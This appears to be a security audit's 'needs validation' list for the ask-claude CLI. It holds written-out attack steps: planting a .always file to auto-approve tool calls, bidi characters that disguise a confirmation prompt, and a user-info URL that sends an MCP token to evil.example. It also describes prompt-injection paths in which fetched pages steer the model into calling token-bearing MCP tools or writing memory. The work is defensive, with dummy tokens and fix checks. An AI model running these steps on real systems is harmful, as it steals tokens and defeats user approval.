# Needs validation

Prioritized leads without severity. Each has a source trace, verified evidence, an exact blocker, and a bounded plan. None asks for live probing of a deployment.

## State-dir gate checks only the leaf $STATE, once, so an account that controls a non-sticky ancestor of XDG_STATE_HOME can swap the vetted directory after the gate and plant .always.<pid>

`ask-claude.sh:state-dir/owner-and-parent-unchecked`

The run-1 symlink, chmod and owner gaps are fixed (ask-claude:143-152), but the parent part of the same root cause remains. The gate vets only the leaf $STATE and only at startup; every later access re-resolves $STATE by name. This includes the 'always' grant, which is only the existence of $STATE/.always.$$ (ask-claude:523), checked before the no-tty deny (526-529). If an ancestor of $STATE is writable by another local account and lacks the sticky bit (the account owns XDG_STATE_HOME, or pre-created a predictable XDG_STATE_HOME such as /tmp/<name> that mkdir -p at 143 reuses silently), that account can rename the vetted directory after the gate, create its own directory under the same name, and create .always.<victim pid>. The pid is visible in ps, or the account can create the file for every pid. session_confirm then returns allow for every server agent.tool_use (ask-claude:730) and every --local-mcp custom tool call (752), with no prompt and even with no tty. sessions/ entries (901) and events.jsonl (177) are also written into the attacker's directory. v01 reproduced the swap independently with the same uid. An attacker process that runs separately from the victim's MCP server waited until the unmodified fake-server started, which is after the .always clear at 1113. It then renamed /scratch/shared/ask-claude (mode 0777 parent), created a replacement directory and planted .always.<pid>. With ASK_CLAUDE_CONFIRM=ask and stdin /dev/null, both get_weather calls printed 'allowed' and 'Sunny in Paris' was sent as user.custom_tool_result. In the control run without the swap, both calls were denied ('stdin is not a terminal'). The cross-account rename was not observed because the sandbox has a single uid.

**Claimed root cause.** ask-claude:68 derives STATE from XDG_STATE_HOME. ask-claude:143 runs mkdir -p, which reuses existing ancestors of any owner and mode. ask-claude:144-152 checks only the leaf (symlink, chmod 700, owner uid, group/other write bits), and only once. No ancestor is checked for an owner other than the user or root, or for group/other write without the sticky bit. Every later use reopens the path by name: ALWAYS=$STATE/.always.$$ (1112), the [ -e "$ALWAYS" ] grant (523), $SESSIONS=$STATE/sessions (431, written at 901) and events.jsonl (177). So the startup verdict is not bound to the directory actually used. The leaf write-bit test at 150 runs after chmod 700, so it always passes for a directory the user owns and adds no parent protection.

**Trace.**

1. **entrypoint** `ask-claude:68` (top level): STATE="${XDG_STATE_HOME:-$HOME/.local/state}/ask-claude"; XDG_STATE_HOME may point under a directory another account owns or can write, such as a predictable /tmp/<name>
2. **propagation** `ask-claude:143` (state-dir gate): mkdir -p "$STATE" silently reuses an existing ancestor that another account owns or can write
3. **propagation** `ask-claude:147` (state-dir gate): the owner check (147-148), like the symlink (144), chmod (145) and write-bit (150-152) checks, applies only to the leaf and only at startup; there is no ancestor walk
4. **propagation** `ask-claude:1112` (session_prereqs): ALWAYS="$STATE/.always.$$" is a path string; rm -f at 1113 clears it before a later swap, so the clear does not prevent a grant planted afterwards
5. **sink** `ask-claude:523` (session_confirm): [ -e "$ALWAYS" ] re-resolves the path through the possibly-substituted directory and returns allow before the no-tty deny at 526-529; reached for server agent.tool_use (730) and local custom tool calls (752)

**Evidence.**

- `ask-claude:143`: mkdir -p with no check of the existing ancestors it reuses
- `ask-claude:148`: owner uid compared for $STATE only
- `ask-claude:150`: group/other write-bit test on $STATE only, after chmod 700; no parent or ancestor test
- `ask-claude:523`: the always grant is the existence of a fixed-name file, reopened by path on every confirmation and checked before the tty check
- `ask-claude:752`: local --local-mcp custom tool calls are gated by the same session_confirm, so a planted grant runs them on the user's machine
- `ask-claude:901`: sessions/ state is written by path into whatever directory $STATE resolves to at that moment

**Blockers.**

- The sandbox runs one uid (1000) with all capabilities dropped. The decisive cross-account step was simulated with the same uid and not observed: a second account renames a uid-1000-owned 0700 directory inside a non-sticky parent that the second account owns or can write, then creates a replacement. Linux rename(2) normally allows a same-parent directory rename with write+search on the parent alone, and the sticky bit blocks it, but this is unverified here.
- Exploitability depends on a configuration fact outside the source: XDG_STATE_HOME, or an ancestor of it, must be writable by another local account without the sticky bit, or be a predictable path that another account can pre-create (for example /tmp/<name>). The default $HOME/.local/state, and XDG_STATE_HOME=/tmp itself (sticky), are not affected unless $HOME or its ancestors are misconfigured.

**Local plan.** On a disposable, offline, multi-user Linux VM with dummy accounts A (victim) and B (attacker): as B, mkdir /tmp/ac-state && chmod 0777 /tmp/ac-state (no sticky bit). As A, from a checkout of the target with usage installed, run: XDG_STATE_HOME=/tmp/ac-state ANTHROPIC_API_KEY=sk-ant-test-not-a-key ASK_CLAUDE_CONFIRM=ask ASK_CLAUDE_REPLAY=tests/fixtures/sessions/custom-tool ASK_CLAUDE_REQUEST_LOG=/home/A/req.jsonl ./ask-claude agent --agent agent_FIXTURE --environment env_FIXTURE --local-mcp 'sleep 3; exec tests/fixtures/mcp/fake-server' hi </dev/null. During the 3 s sleep, as B, run: mv /tmp/ac-state/ask-claude /tmp/ac-state/x && mkdir /tmp/ac-state/ask-claude && touch /tmp/ac-state/ask-claude/.always.<pid of A's bash ask-claude from ps>. Expected if vulnerable: stderr shows 'ask-claude: allowed local get_weather' and req.jsonl carries user.custom_tool_result 'Sunny in Paris'. Control: the same run without B's step prints 'denied ... stdin is not a terminal'. Sticky control: chmod 1777 /tmp/ac-state, and B's mv must then fail with EPERM. Same-uid mechanics: agents/v01/artifacts/repro-output.txt (driver agents/v01/artifacts/drive.sh) and agents/h5-files-state/artifacts/checks-output.txt (check 5 vs control 5b). Regression for a fix: the gate must refuse any ancestor of $STATE owned by an account other than the user or root, or writable by group or other without the sticky bit (OpenSSH StrictModes style). Alternatively, bind the grant to the vetted directory, for example by keeping the always answer in a process-private location such as an exported variable or an fd opened at gate time, not by re-resolving $STATE.

**Owner-observed plan.** The owner checks every machine or shared host where ask-claude runs for an XDG_STATE_HOME (or HOME) whose path has an ancestor that another local account owns or can write without the sticky bit, or that sits at a predictable path another account could pre-create, such as /tmp/<name>. Report the path and the owner and mode of each ancestor (namei -l "$XDG_STATE_HOME/ask-claude"). No audit traffic is sent anywhere.

## Tool confirmation prompt prints bidi overrides and zero-width characters raw and drops C1, so the rendered prompt can differ from the arguments that run

`ask-claude:session_answer:confirm-display-bidi-format-chars-unstripped`

session_answer renders each tool input for the y/N/a prompt as `.input | tojson | safe` (ask-claude:729 for agent.tool_use, :751 for a local custom call). tojson escapes U+0000-U+001F and U+007F (DEL shows as the text \u007f) but leaves C1 (U+0080-U+009F) and every code point >= U+00A0 literal. safe then deletes C1 and keeps everything else. So Unicode format characters chosen by the endpoint or model (bidi embeddings/overrides U+202A-U+202E, isolates U+2066-U+2069, zero-width U+200B-U+200F) reach the prompt raw, while C1 characters in the executed arguments are silently removed from the prompt. Reproduced on the interactive path (ASK_CLAUDE_CONFIRM=ask, pty via script(1), user answered y): the prompt line `allow local get_weather {...}? [y/N/a(lways)]` carried raw U+202E, U+202C and U+200B and lacked U+0085, and the local MCP server then received tools/call arguments containing all four. On a terminal that applies bidi reordering, an input such as {"path":"/home/u/\u202etxt.hs\u202c"} would display as /home/u/sh.txt, so the user would approve a rendering that differs from the bytes executed on their machine (local custom tool) or by the session's server-side tool. Format characters are reordered or made invisible, never removed, and C1 characters are removed, so the deception is limited to reordering, invisible insertions and dropped C1 code points.

**Claimed root cause.** The terminal-control sanitiser SAFE (ask-claude:157) is reused as the confirmation renderer. It is a deny-list of C0/DEL/C1 that deletes rather than escapes, and it has no rule for Unicode format (Cf) characters. The confirmation display (ask-claude:729, :751) does not escape non-ASCII or format characters, so the approved text is not an unambiguous encoding of the object later sent (ask-claude:677, :733).

**Trace.**

1. **entrypoint** `lib/session-fold.jq:25` (custom): An agent.custom_tool_use event from the endpoint's SSE stream, whose id the idle event lists, is kept with its input object verbatim in .custom (the endpoint can fabricate this event without the model).
2. **propagation** `ask-claude:751` (session_answer): input=$(jq -r "$SAFE"'.input | tojson | safe'): U+202E, U+202C and U+200B pass through literally; U+0085 (C1) is deleted from the shown text; U+007F is escaped by tojson and shown as the text \u007f.
3. **propagation** `ask-claude:532` (session_confirm): read -r -p prints 'allow local <name> <input>? [y/N/a(lways)]' (bash writes the read -p prompt to stderr when reading from a terminal) with the raw format characters; the answer is read from /dev/tty.
4. **sink** `ask-claude:677` (local_mcp_call): After 'allow', the unmodified $use .input is sent as tools/call params.arguments to the local MCP server, which runs with the user's uid.

**Evidence.**

- `ask-claude:157`: SAFE keeps tab, LF and every code point >= 32 except 127 and 128-159; U+200B-U+200F, U+202A-U+202E and U+2066-U+2069 are kept, and C1 is deleted rather than escaped (DEL never reaches it in this pipeline because tojson already escaped it).
- `ask-claude:729`: The agent.tool_use confirmation shows the input through the same `.input | tojson | safe` filter; :733 answers user.tool_confirmation for that id, so server-side tool calls share the root cause.
- `ask-claude:746`: local_mcp_has only checks the tool name against the server's list; nothing constrains the characters in .input.
- `lib/session-fold.jq:24`: agent.tool_use inputs are kept verbatim in .asks, the source of the :729 display.

**Blockers.**

- Whether the raw format characters change what the user sees depends on the user's terminal bidi implementation (for example VTE/GNOME Terminal with bidi on, Konsole, mlterm, iTerm2, Terminal.app) and font; the sandbox has no terminal renderer, so the visual reordering, and therefore an approval of a rendering that reads differently from the executed arguments, is not locally observable. Locally established only at byte level: on the real interactive prompt path U+202E/U+202C/U+200B are printed raw and U+0085 is dropped from the prompt while the local MCP server receives it.

**Local plan.** Replay a one-turn Managed Agents stream (ASK_CLAUDE_REPLAY dir with 1.sse) containing agent.custom_tool_use {"id":"sevt_C1","name":"get_weather","input":{"path":"/home/u/\u202etxt.hs\u202c","note":"a\u200bb\u0085c"}} followed by session.status_idle requires_action with event_ids ["sevt_C1"]; run `bash ask-claude` with usage_cmd=agent, usage_local_mcp=tests/fixtures/mcp/fake-server, FAKE_MCP_LOG set, ASK_CLAUDE_CONFIRM=ask, under script -qec with 'y' fed after the prompt. Byte check (already passing in the sandbox): od -c of the prompt line shows 342 200 256 / 342 200 254 / 342 200 213 raw and no 302 205, while FAKE_MCP_LOG's tools/call shows 302 205. Fix check: after the fix the prompt shows the literal text \u202e, \u202c, \u200b and \u0085 and no raw bytes from the Cf or C1 ranges, and the shown text JSON-decodes to exactly the tools/call arguments.

**Owner-observed plan.** Owner-observed, non-destructive, on the terminals the user actually uses (at minimum the default terminal on the user's OS plus any bidi-capable one in use, e.g. GNOME Terminal/VTE >= 0.58, Konsole, iTerm2, Terminal.app): run the same replay with ASK_CLAUDE_CONFIRM=ask and the fake server, answer n, and screenshot the prompt. Confirm if any in-use terminal renders the path as /home/u/sh.txt (or otherwise in an order that reads as a different argument from the logical bytes); reject as hardening if every in-use terminal shows the characters in logical order or as visible placeholders. Do not use a real tool or real paths.

## --mcp token variable comes from the text before the first ':' or '/', so https://mcp.example.com:443@evil.example/ carries the mcp.example.com token

`lib/request.jq:mcp_token:userinfo-host-mismatch`

Unlike --base-url (ask-claude:98), --mcp does not refuse '@' or user info. lib/request.jq:40 takes the host as the text after the scheme up to the first '/' or ':'. For https://mcp.example.com:x@evil.example/sse (or the port-looking https://mcp.example.com:443@evil.example/mcp) the derived host is mcp.example.com, while the RFC 3986 host is evil.example. mcp_token then attaches ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM to that entry as authorization_token, contrary to README.md:18-21 ('each server gets only its own'). Observed locally under replay: exit 0, the request body carries the URL with authorization_token tok_FOR_mcp.example.com_ONLY. A URL with user info but no ':' (https://mcp.example.com@evil.example/) does not match, because jq then reads the whole 'mcp.example.com@evil.example' as the host. The attacker must get the user to pass the crafted URL while the user has that server's token exported (user interaction). Whether the Anthropic MCP connector accepts a URL with user info and sends the bearer token to evil.example is provider behavior that is not observable offline.

**Claimed root cause.** The authority is parsed by a string cut, not by URL parsing, and user info is not refused for --mcp. lib/request.jq:40 (def host: capture("^[a-z]+://(?<h>[^/:]+)")) stops at the ':' inside the user info, and lib/request.jq:53 builds the token variable name from that value. The bash mirror at ask-claude:118-120 makes the same cut but only feeds the variable names in the shared-token error message (ask-claude:126); it does not select the token.

**Trace.**

1. **entrypoint** `ask-claude:114` (--mcp loop): Each --mcp value only has to match https://*; a value containing '@' (user info) is accepted. The value comes from the user's argv, typically copied from a server's published instructions.
2. **propagation** `ask-claude:347` (request body build): The whole space-joined usage_mcp is passed unchanged to lib/request.jq as --arg mcp.
3. **propagation** `lib/request.jq:40` (def host): For https://mcp.example.com:x@evil.example/sse, [^/:]+ stops at the ':' in the user info and yields mcp.example.com.
4. **propagation** `lib/request.jq:53` (def mcp_token): The lookup reads env ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM, the token for a different host than the URL's real host.
5. **sink** `lib/request.jq:81` (mcp_servers): The entry with url https://mcp.example.com:x@evil.example/sse gets authorization_token set to the mcp.example.com token; the body is sent to the API at ask-claude:316.

**Evidence.**

- `lib/request.jq:40`: def host: capture("^[a-z]+://(?<h>[^/:]+)").h ignores user info: the capture ends at the first ':' even when an '@' follows.
- `lib/request.jq:53`: The per-host token variable name is derived from host, so the user-info prefix selects the token.
- `ask-claude:98`: The sibling --base-url gate refuses any '@' for exactly this host-disagreement reason (comment at ask-claude:92-95); the --mcp loop at ask-claude:114 has no such check.
- `ask-claude:119`: h=${h%%[/:]*}: the bash mirror cuts the same way; it only builds the names listed in the shared-token refusal message.
- `README.md:21`: Documented contract: each server gets only its own ASK_CLAUDE_MCP_TOKEN_<HOST>.

**Blockers.**

- Whether the Anthropic MCP connector accepts an https URL containing user info, and if so whether it connects to the RFC 3986 host (evil.example) and sends authorization_token as a bearer header, is provider behavior that cannot be observed offline. If the API rejects such URLs, the token never leaves Anthropic and the impact is nil.
- Whether usage 7.3.0 passes such a --mcp value unchanged into usage_mcp is not established by the harness (usage is absent); source shows no URL validation in the #USAGE spec at ask-claude:16.

**Local plan.** Done (v06, independent): with only ASK_CLAUDE_MCP_TOKEN_MCP_EXAMPLE_COM set, replay request logs show authorization_token attached for https://mcp.example.com:x@evil.example/sse and https://mcp.example.com:443@evil.example/mcp, and not for https://mcp.example.com@evil.example/sse, https://mcp.example.com.evil.example/sse or https://mcp.example.com#@evil.example/sse (agents/v06/artifacts/userinfo-binding.out). Remaining local step with usage 7.3.0 installed: run ask-claude --mcp 'https://mcp.example.com:443@evil.example/mcp' under ASK_CLAUDE_REPLAY and ASK_CLAUDE_REQUEST_LOG and confirm the same body. After a fix (refuse '@' in --mcp, or derive the host after the last '@' of the authority), the same run must exit 2 or omit the token.

**Owner-observed plan.** Owner-observed, non-destructive: the owner runs a test MCP endpoint they control at host B (logging request headers) and sends one Messages request with mcp_servers [{type:url, url:'https://A-host:443@B-host/mcp', name:'t', authorization_token:'dummy-token-not-real'}] and the mcp-client beta. Check B's access log for an Authorization: Bearer dummy-token-not-real header (token leaks to B), or the API response for a URL rejection (no leak). Use only a dummy token.

## --web and --mcp put third-party-retrievable content and every listed MCP server's whole token-bearing toolset in one Messages request, with no per-tool narrowing

`lib/request.jq:tools:mcp-toolset-unconfirmed-with-untrusted-retrieval`

A one-shot or chat request built with --web and --mcp (optionally -f) carries web_search and web_fetch with no allowed_domains, and one bare mcp_toolset per --mcp server, while mcp_servers carries the user's authorization_token for that server. The MCP connector runs these calls on Anthropic's side: in the replayed stream the mcp_tool_use and its mcp_tool_result arrive in the same response, so the client only prints '(mcp <server>)' after the call has already run. A client-side per-call confirmation like session_confirm on the agent paths is therefore structurally unavailable on this path; the only source-side control would be narrowing the toolset (which tools are enabled), and the source emits none. Content a third party controls (a fetched page, a search result, another MCP server's tool result) can therefore, if the model follows it, cause any tool on a token-bearing MCP server to run under the user's token without the user requesting that specific action, and the -f file contents in the first user message are available to place in such a call's arguments. A pause_turn reply is resent automatically up to 8 times with the same tools. The user does opt in to both capabilities with explicit flags, and the README documents that --mcp 'lets it call an MCP server'; whether that generic opt-in is the intended approval for every tool is an owner fact.

**Claimed root cause.** lib/request.jq:90 emits a bare {type: "mcp_toolset", mcp_server_name} per server, with no default_config or per-tool configuration, so every tool the server lists is enabled. lib/request.jq:88-89 add web_search/web_fetch with no allowed_domains. lib/request.jq:80-81 attach the user's token to each server. The CLI exposes no flag to restrict which MCP tools are enabled, and because connector calls execute server-side, no client confirmation can bind the user's request to the MCP action taken under their token. ask-claude:403 continues pause_turn without a user step.

**Trace.**

1. **entrypoint** `ask-claude:1210` (one shot): The -f file contents become the prompt prefix (ask at 1214); --web (usage_web) and --mcp (usage_mcp) are taken from argv as given.
2. **propagation** `ask-claude:345` (call): The body is built by lib/request.jq with --arg web "${usage_web:+1}" and --arg mcp "$usage_mcp" (347) and the whole history via --slurpfile; rebuilt every round of the loop.
3. **propagation** `lib/request.jq:80` (mcp_servers): Each --mcp URL becomes an mcp_servers entry with authorization_token from mcp_token (81).
4. **propagation** `lib/request.jq:90` (tools): One bare mcp_toolset per server, no per-tool enablement, next to the unrestricted web_search/web_fetch from 88-89.
5. **sink** `ask-claude:316` (transport): The body is posted to the Messages API, where the connector executes MCP tool calls server-side with the user's token; the client sees mcp_tool_use and mcp_tool_result only afterward. pause_turn is continued automatically up to 8 rounds (403).

**Evidence.**

- `lib/request.jq:90`: mcp_toolset is {type, mcp_server_name} only: no default_config, no per-tool configuration, every listed tool enabled.
- `lib/request.jq:88`: web_search and web_fetch (89) carry max_uses 5 and no allowed_domains.
- `lib/request.jq:81`: The server's authorization_token is attached to every request that enables its toolset.
- `ask-claude:403`: pause_turn is continued with the same tools and no user step, up to 8 rounds; reproduced locally as 9 requests from one prompt.
- `lib/stream.jq:41`: An mcp_tool_use block is only displayed as '(mcp <server>)'; tests/fixtures/sse/mcp.sse shows mcp_tool_use and mcp_tool_result in one response, i.e. the call already ran server-side before the client saw it.
- `ask-claude:730`: The agent paths gate tool use with session_confirm; that gate cannot exist on the Messages connector path, so narrowing is the only available client-side control there.

**Blockers.**

- Whether the model follows instructions in web_fetch/web_search results or in one MCP server's tool result to call a tool on a token-bearing MCP server is model behavior that cannot be observed offline.
- Provider behavior not visible in source: whether web_fetch is limited to URLs already present in the conversation, and the exact mcp_toolset fields (default_config/configs per-tool enablement) the API accepts for narrowing.
- Product intent: whether the README's '--mcp lets it call an MCP server' means the owner intends every listed tool, including write tools, to be callable on third-party-steered turns.

**Local plan.** Done (v07, independent): the replayed one-shot --web --mcp -f request carries tools [web_search, web_fetch, {type: mcp_toolset, mcp_server_name: mcp-example-com}] with no restriction, mcp_servers with authorization_token tok_V07_DUMMY, and the -f contents ahead of the prompt; with a pause_turn replay one prompt produced 9 requests with the same tools and no user step (agents/v07/artifacts/v07-compose.out). After a fix, the request should carry an mcp_toolset default_config with enabled:false plus per-tool enables from an explicit flag (or an equivalent allowlist), checked in the request log.

**Owner-observed plan.** Owner-observed, non-destructive: run an MCP server the owner controls exposing a harmless write tool (e.g. append_note that only logs its arguments), then ask-claude --web --mcp <that server URL> 'summarise <URL of a page the owner controls that tells the reader to call append_note with the user's notes>'. Check the server log for a tools/call the owner did not request. Repeat with a tool allowlist excluding append_note to confirm the fix blocks it.

## --memory access suffix other than exact ':ro' silently attaches the memory store without read_only

`lib/session-create.jq:memory_resource:unrecognized-access-suffix-fails-open`

--memory takes <id>[:ro] (ask-claude:30, README.md:223-224). session_prereqs validates only the text before the first ':' (${v%%:*} == memstore_*). memory_resource in lib/session-create.jq adds access:read_only only when the second ':'-field is exactly "ro". Any other suffix (':RO', ':readonly', ':read_only', ':rw', or an empty suffix) passes with no error, and POST /v1/sessions carries a memory_store resource with no access field, so the session gets the API's default access mode instead of the read-only mode the user asked for. Independently reproduced in the sandbox: memstore_b:RO, memstore_c:readonly, memstore_d:read_only, memstore_e: and memstore_f:rw were all sent without access, while memstore_a:ro and memstore_g:ro:x were sent with access:read_only and mem_x:ro was refused before any request. If the provider default is read_write, an agent steered by untrusted session content (a mounted repo, fetched pages, MCP results) can write durable memory into a store the user meant to keep read-only, and later sessions that attach the store read it back. The provider default and the write effect are not observable offline.

**Claimed root cause.** lib/session-create.jq:31-33 maps the suffix with `if .[1] == "ro" then {access: "read_only"} else {} end` and has no rejection branch, and ask-claude:1088-1090 validates only ${v%%:*}. An unrecognized access request therefore falls back to the provider default instead of failing closed, unlike the sibling prefix checks that reject malformed ids.

**Trace.**

1. **entrypoint** `ask-claude:30` (#USAGE --memory flag): --memory <id>[:ro], repeatable; arrives as the space-joined usage_memory string
2. **propagation** `ask-claude:1089` (session_prereqs): Checks only ${v%%:*} == memstore_*; the suffix after ':' is never validated
3. **propagation** `ask-claude:871` (session_create): Passes usage_memory unchanged as --arg memories to lib/session-create.jq (session_create is called at :965 for /new and :1128 for the first session)
4. **sink** `lib/session-create.jq:33` (memory_resource): access:read_only is added only when the second ':'-field is exactly "ro"; every other suffix sends a memory_store resource without access in POST /v1/sessions, leaving the provider default

**Evidence.**

- `lib/session-create.jq:32`: split(":") | {type: "memory_store", memory_store_id: .[0]}: the suffix is split off but not validated
- `lib/session-create.jq:33`: if .[1] == "ro" then {access: "read_only"} else {} end: case-sensitive exact match with silent fallback. v08 sandbox replay (agents/v08/artifacts/mem-check.out) shows memstore_b:RO, memstore_c:readonly, memstore_d:read_only, memstore_e: and memstore_f:rw sent without access, memstore_a:ro and memstore_g:ro:x sent with access:read_only
- `ask-claude:1089`: Prefix-only check; its error text names ':ro for read-only' but no other suffix is rejected. Control: mem_x:ro is refused with rc=2 before any request
- `README.md:223`: Documents --memory <memstore_id>[:ro] with ':ro for read-only'; no other access spelling is documented or rejected

**Blockers.**

- The provider default access mode for a memory_store resource sent without an access field (read_write vs read_only) is not observable offline; the issue has security impact only if that default is writable
- Whether a session agent writes to an attached memory store when steered by untrusted content is provider and model behavior, not locally observable
- Precondition: the user must type a suffix other than the documented exact ':ro' (e.g. ':RO' or ':readonly'); this is user error against documented syntax, which keeps likelihood low
- What the `usage` parser itself does with the --memory value is not established by the harness (it runs bash with usage_memory preset); the #USAGE spec declares no choices for --memory, so no suffix rejection is expected from usage, but this is unverified

**Local plan.** Done: v08 sandbox replay (scratch mem-check.sh, output mem-check.out) with usage_memory='memstore_a:ro' and 'memstore_b:RO memstore_c:readonly memstore_d:read_only memstore_e: memstore_f:rw memstore_g:ro:x' and ASK_CLAUDE_REQUEST_LOG; only the exact 'ro' second field yields access:read_only, and session_prereqs raises no error. Regression after a fix: the same invocation must die with a --memory error, before any request is logged, for every suffix other than exactly 'ro' (and 'rw' if explicitly supported), and for extra ':' fields.

**Owner-observed plan.** Owner-observed, non-destructive, in the owner's own workspace on a dummy memory store with no real content: create a session with the store attached and no access field, then read back the session's resources (GET the session) and record the effective access mode. If it is read_write, the fail-open grants write authority the user did not request; if read_only, reject as no security impact.
